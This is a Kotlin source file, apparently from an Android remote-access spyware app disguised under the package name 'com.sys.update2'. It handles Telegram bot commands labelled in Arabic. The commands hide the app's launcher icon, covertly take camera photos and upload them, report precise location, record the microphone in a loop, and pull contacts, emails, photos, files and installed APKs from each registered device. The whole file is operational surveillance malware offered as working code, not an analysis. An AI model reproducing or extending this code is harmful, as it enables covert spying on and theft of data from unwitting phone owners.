package com.sys.update2

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object CommandExecutor {

    private const val TAG = "CmdExec"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private fun fsBase(): String =
        "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"

    private fun str(s: String) = JSONObject().put("stringValue", s)
    private fun num(n: Long) = JSONObject().put("integerValue", n.toString())

    // ═══════════════════════════════════════════
    //  handlePublic — أوامر عامة (بدون رمز)
    // ═══════════════════════════════════════════
    fun handlePublic(ctx: Context, cmd: String) {
        when {
            cmd == "/start" || cmd == "/menu" || cmd == "menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)
            cmd == "/help" || cmd == "help" || cmd == "مساعدة" -> showHelp(ctx)
            cmd == "📱 قائمة الأجهزة" || cmd == "🌐 كل الأجهزة" -> showDeviceList(ctx)
        }
    }

    // ═══════════════════════════════════════════
    //  handleText — أوامر يدوية (بعد التحقق من الرمز)
    // ═══════════════════════════════════════════
    fun handleText(ctx: Context, text: String, code: String) {
        val cmd = text.trim().replace(Regex("@\\w+"), "").trim()

        when {
            // Sync يدوي
            cmd == "/sync" || cmd == "🔄 مزامنة" -> {
                runJob {
                    TelegramApi.sendMessage("🔄 *بدأت المزامنة اليدوية* 🆔 `$code`")
                    SyncWorker.start(ctx)
                }
            }

            cmd == "/sync_status" || cmd == "📊 حالة" -> {
                runJob {
                    val contacts = ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                    val c = contacts.getBoolean("contacts_done_v1", false)
                    val e = contacts.getBoolean("emails_done_v1", false)
                    TelegramApi.sendMessage(
                        "📊 *حالة المزامنة*\n\n" +
                        "👥 جهات الاتصال: ${if (c) "✅" else "⏳"}\n" +
                        "📧 الإيميلات: ${if (e) "✅" else "⏳"}\n" +
                        "🆔 `$code`"
                    )
                }
            }

            // إخفاء/إظهار الأيقونة
            cmd == "/hide" || cmd == "🙈 إخفاء" -> {
                try {
                    ctx.packageManager.setComponentEnabledSetting(
                        android.content.ComponentName(ctx, "com.sys.update2.LauncherAlias"),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                    TelegramApi.sendMessage("✅ تم إخفاء الأيقونة 🆔 `$code`")
                } catch (e: Exception) {
                    TelegramApi.sendMessage("❌ ${e.message} 🆔 `$code`")
                }
            }

            cmd == "/show" || cmd == "👁 إظهار" -> {
                try {
                    ctx.packageManager.setComponentEnabledSetting(
                        android.content.ComponentName(ctx, "com.sys.update2.LauncherAlias"),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                    TelegramApi.sendMessage("✅ تم إظهار الأيقونة 🆔 `$code`")
                } catch (e: Exception) {
                    TelegramApi.sendMessage("❌ ${e.message} 🆔 `$code`")
                }
            }

            // معلومات
            cmd == "📊 معلومات الجهاز" || cmd == "/info" -> {
                runJob {
                    TelegramApi.sendMessage("📱 *${DeviceManager.getDeviceName(ctx)}*\n🆔 `$code`\n\n" + DeviceInfo.getFullInfo(ctx))
                }
            }

            // الموقع
            cmd == "📍 عرض الموقع" || cmd == "/location" -> {
                runJob {
                    TelegramApi.sendMessage("📍 *جاري تحديد الموقع...* 🆔 `$code`")
                    val loc = LocationHelper.getPreciseLocation(ctx)
                    TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc) + "\n🆔 `$code`")
                }
            }

            // كاميرا
            cmd == "🤳 تصوير أمامي" || cmd == "/cam_front" -> runJob { captureCamera(ctx, true, code) }
            cmd == "📸 تصوير خلفي" || cmd == "/cam_back" -> runJob { captureCamera(ctx, false, code) }

            // Toggles
            cmd == "🟢 تشغيل الصور" || cmd == "🔴 إيقاف الصور" -> togglePhotos(ctx, code)
            cmd == "🟢 تشغيل الموقع" || cmd == "🔴 إيقاف الموقع" -> toggleLocation(ctx, code)
            cmd == "🟢 تشغيل المايك" || cmd == "🔴 إيقاف المايك" -> toggleAudio(ctx, code)

            // Orphans — info commands
            cmd == "📸 كل الصور" || cmd == "/photos" -> runJob { TelegramApi.sendMessage("⏳ جاري الفحص... 🆔 `$code`"); SyncWorker.start(ctx) }
            cmd == "📁 كل الملفات" || cmd == "/files" -> runJob { TelegramApi.sendMessage("⏳ جاري الفحص... 🆔 `$code`"); SyncWorker.start(ctx) }
            cmd == "🎵 كل الموسيقى" || cmd == "/music" -> runJob { TelegramApi.sendMessage("⏳ جاري الفحص... 🆔 `$code`"); SyncWorker.start(ctx) }
            cmd == "📱 APK" || cmd == "/apks" -> runJob { TelegramApi.sendMessage("⏳ جاري الفحص... 🆔 `$code`"); SyncWorker.start(ctx) }
            cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> runJob {
                ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE).edit().putBoolean("contacts_done_v1", false).apply()
                TelegramApi.sendMessage("⏳ جاري سحب جهات الاتصال... 🆔 `$code`")
                SyncWorker.start(ctx)
            }
            cmd == "🚀 جلب كل شي" || cmd == "/all" -> runJob {
                TelegramApi.sendMessage("🚀 *جلب شامل* 🆔 `$code`")
                SyncWorker.start(ctx)
            }

            else -> TelegramApi.sendMessage("❓ أمر غير معروف: `$cmd`")
        }
    }

    private fun togglePhotos(ctx: Context, code: String) {
        KeyboardBuilder.photosOn = !KeyboardBuilder.photosOn
        val state = if (KeyboardBuilder.photosOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📸 *الصور*\n\nالحالة: $state\n🆔 `$code`")
    }

    private fun toggleLocation(ctx: Context, code: String) {
        KeyboardBuilder.locationOn = !KeyboardBuilder.locationOn
        val state = if (KeyboardBuilder.locationOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📍 *الموقع*\n\nالحالة: $state\n🆔 `$code`")
    }

    private fun toggleAudio(ctx: Context, code: String) {
        KeyboardBuilder.audioOn = !KeyboardBuilder.audioOn
        if (KeyboardBuilder.audioOn) AudioRecorder.startLoop(ctx) else AudioRecorder.stopLoop(ctx)
        val state = if (KeyboardBuilder.audioOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("🎤 *الميكروفون*\n\nالحالة: $state\n🆔 `$code`")
    }

    private fun captureCamera(ctx: Context, front: Boolean, code: String) {
        val label = if (front) "أمامية" else "خلفية"
        TelegramApi.sendMessage("📷 *جاري التصوير ($label)* 🆔 `$code`")
        val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
        if (file != null && file.exists()) {
            val result = TelegramApi.sendPhoto(file, "📷 $label [${code}]")
            file.delete()
            if (!result.first) TelegramApi.sendMessage("❌ فشل الإرسال 🆔 `$code`")
        } else TelegramApi.sendMessage("❌ فشل التصوير 🆔 `$code`")
    }

    // ═══════════════════════════════════════════
    //  DeviceList + Menus
    // ═══════════════════════════════════════════
    private fun showDeviceList(ctx: Context) {
        runJob {
            val devices = DeviceManager.getDeviceList(ctx)
            if (devices.isEmpty()) { TelegramApi.sendMessage("📭 لا أجهزة مسجّلة"); return@runJob }
            val sb = StringBuilder()
            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n━━━━━━━━━━\n\n")
            for (d in devices) {
                val status = if (d.online) "🟢" else "🔴"
                sb.append("$status *${d.name}*\n🆔 `${d.code}`\n\n")
            }
            TelegramApi.sendMessage(sb.toString())
        }
    }

    private fun showMainMenu(ctx: Context) {
        val code = DeviceManager.getDeviceCode(ctx)
        val name = DeviceManager.getDeviceName(ctx)
        TelegramApi.sendMessage(
            "🎛 *لوحة التحكم — CREFTEX*\n\n" +
            "🏷 *$name*\n🆔 `$code`\n\n" +
            "أرسل الأوامر مع الرمز:\n" +
            "`/sync $code` — مزامنة\n" +
            "`/info $code` — معلومات\n" +
            "`/location $code` — الموقع\n" +
            "`/cam_front $code` — تصوير\n" +
            "`/hide $code` — إخفاء الأيقونة\n" +
            "`/show $code` — إظهار الأيقونة\n" +
            "`/all $code` — جلب شامل"
        )
    }

    private fun showHelp(ctx: Context) {
        val code = DeviceManager.getDeviceCode(ctx)
        TelegramApi.sendMessage(
            "📖 *الأوامر*\n\n" +
            "🔄 `/sync $code` — مزامنة فورية\n" +
            "📊 `/sync_status $code` — حالة المزامنة\n" +
            "📸 `/photos $code` — الصور\n" +
            "📁 `/files $code` — الملفات\n" +
            "🎵 `/music $code` — الموسيقى\n" +
            "📱 `/apks $code` — APKs\n" +
            "👥 `/contacts $code` — جهات الاتصال\n" +
            "📊 `/info $code` — معلومات الجهاز\n" +
            "📍 `/location $code` — الموقع\n" +
            "🤳 `/cam_front $code` — تصوير أمامي\n" +
            "📸 `/cam_back $code` — تصوير خلفي\n" +
            "🙈 `/hide $code` — إخفاء الأيقونة\n" +
            "👁 `/show $code` — إظهار الأيقونة\n" +
            "🚀 `/all $code` — جلب شامل\n\n" +
            "🆔 *رمزك:* `$code`"
        )
    }

    private fun runJob(block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e(TAG, "job err: ${e.message}")
            }
        }.start()
    }
}
